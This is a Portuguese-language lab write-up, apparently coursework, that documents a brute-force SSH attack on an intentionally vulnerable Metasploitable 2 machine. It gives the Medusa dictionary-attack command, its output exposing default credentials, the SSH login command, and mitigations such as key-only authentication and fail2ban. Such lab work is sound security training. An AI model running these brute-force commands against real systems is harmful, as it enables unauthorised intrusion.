# Prova de Conceito: Acesso SSH via Brute-Force (Credenciais Fracas)

Documentação da exploração de uma vulnerabilidade de configuração (senha fraca) no Metasploitable 2, como parte do Desafio Dio-Santander.

**Alvo:** Metasploitable 2 (`192.168.15.10`)
**Vetor:** Porta 22/SSH (`OpenSSH 4.7p1`)

---

## Fase 1: Reconhecimento

A varredura inicial do Nmap (documentada anteriormente) identificou o serviço SSH em execução.

* **Serviço Identificado:** `22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)`

---

## Fase 2: Análise de Vulnerabilidade

* **Análise:** O Metasploitable 2 é intencionalmente configurado com credenciais fracas e fáceis de adivinhar. A vulnerabilidade explorada aqui não é uma falha de software (como um *buffer overflow*), mas sim uma **má configuração de segurança crítica**: o uso de senhas padrão e fracas.
* **Plano de Ataque:** Realizar um ataque de força bruta (Brute Force) usando um dicionário de usuários e senhas comuns para encontrar uma combinação válida.

---

## Fase 3: Exploração (Brute Force)

Foi utilizada a ferramenta **Medusa** para automatizar o ataque de dicionário contra o serviço SSH.

* **Comando:**
    ```bash
    medusa -h 192.168.15.10 -U wordlist.txt -P wordlist.txt -M ssh -n 22
    ```
    *(Onde `wordlist.txt` continha nomes de usuário e senhas prováveis, como "msfadmin")*

* **Resultado do Ataque:**
    A ferramenta testou várias combinações até encontrar um par válido.
    ```text
    ...
    2025-10-24 11:55:07 ACCOUNT CHECK: [ssh] Host: 192.168.15.10 (1 of 1, 0 complete) User: msfadmin (4 of 5, 3 complete) Password: msfadmin (4 of 5 complete)
    2025-10-24 11:55:07 ACCOUNT FOUND: [ssh] Host: 192.168.15.10 User: msfadmin Password: msfadmin [SUCCESS]
    ```
* **Credenciais Encontradas:** O ataque foi bem-sucedido e revelou as credenciais:
    * **Usuário:** `msfadmin`
    * **Senha:** `msfadmin`

---

## Fase 4: Pós-Exploração (Acesso)

Com as credenciais válidas, o acesso ao sistema foi estabelecido usando o cliente SSH padrão.

* **Comando de Acesso:**
    *(A flag `-o HostKeyAlgorithms=+ssh-rsa` foi necessária para compatibilidade com o servidor SSH antigo)*
    ```bash
    ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@192.168.15.10
    ```

* **Prova de Acesso:**
    Após inserir a senha `msfadmin`, um *shell* de usuário foi obtido no sistema alvo.
    ```text
    msfadmin@192.168.15.10's password: 
    Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
    ...
    msfadmin@metasploitable:~$ 
    ```

---

## Conclusão e Mitigação

* **Impacto:** Acesso não autorizado ao sistema com privilégios de usuário (`msfadmin`). A partir deste ponto, um atacante poderia tentar uma **Escalação de Privilégios** para obter controle total (`root`).
* **Mitigação:**
    1.  **Senhas Fortes:** Implementar uma política de senhas robustas e complexas.
    2.  **Autenticação por Chave:** Desabilitar a autenticação por senha no SSH e permitir apenas o login via chaves criptográficas (SSH Keys).
    3.  **Fail2Ban:** Utilizar ferramentas como `fail2ban` para banir automaticamente IPs que falham repetidamente nas tentativas de login.
